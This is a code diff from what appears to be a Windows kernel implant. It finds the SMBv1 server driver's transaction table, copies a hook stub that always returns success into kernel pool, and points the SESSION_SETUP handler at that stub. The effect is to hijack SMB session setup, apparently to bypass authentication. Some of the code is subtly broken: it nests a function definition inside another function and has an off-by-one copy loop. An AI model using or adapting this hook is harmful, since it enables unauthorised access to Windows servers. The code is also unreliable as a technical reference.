@@ -50,11 +50,14 @@ INT WindowsEntrypoint()
 
     LPVOID                SecPr1 = 0;
     LPVOID                SecPr2 = 0;
+    LPVOID                OnePtr = 0;
+    LPVOID                TwoPtr = 0;
+    LPVOID                HckPtr = 0;
     LPVOID               *TrnTbl = 0;
     LPVOID               *TblPtr = 0;
-    LPVOID                EndPtr = 0;
     DWORD                 SecNm1 = 0;
     DWORD                 SecNm2 = 0;
+    DWORD                 HookNm = 0;
 
     NtsHdr = NT_HDR(Drvs.SrvSmbv1Base);
     SecHdr = IMAGE_FIRST_SECTION(NtsHdr);
@@ -102,9 +105,33 @@ INT WindowsEntrypoint()
       };
       TrnTbl++;
     } while ( SecNm1-- != 0 );
-  };
+
+    NTSTATUS SpAcceptLsaModeContext_Hook()
+    {
+      return 0;
+    };
+ 
+    VOID SpAcceptLsaModeContext_Hook_End() {};
 
 FoundTransactionTable:
+    Func.ExAllocatePool = GetPeFunc(
+	Drvs.NtosKrnlBase, HASH_EXALLOCATEPOOL
+    );
+
+    HookNm = (DWORD)(
+	((ULONG_PTR)SpAcceptLsaModeContext_Hook_End) - 
+	((ULONG_PTR)SpAcceptLsaModeContext_Hook));    
+    HckPtr = Func.ExAllocatePool(PagedPool, HookNm);
+    
+    OnePtr = HckPtr; TwoPtr = (LPVOID)
+      &SpAcceptLsaModeContext_Hook;
+
+    do {
+      *(BYTE *)OnePtr++ = *(BYTE *)TwoPtr++;
+    } while ( HookNm-- != 0 );
+
+    TblPtr[INDEX_SESSION_SETUP] = (LPVOID)HckPtr;
+  };
 
   return 0;
 };
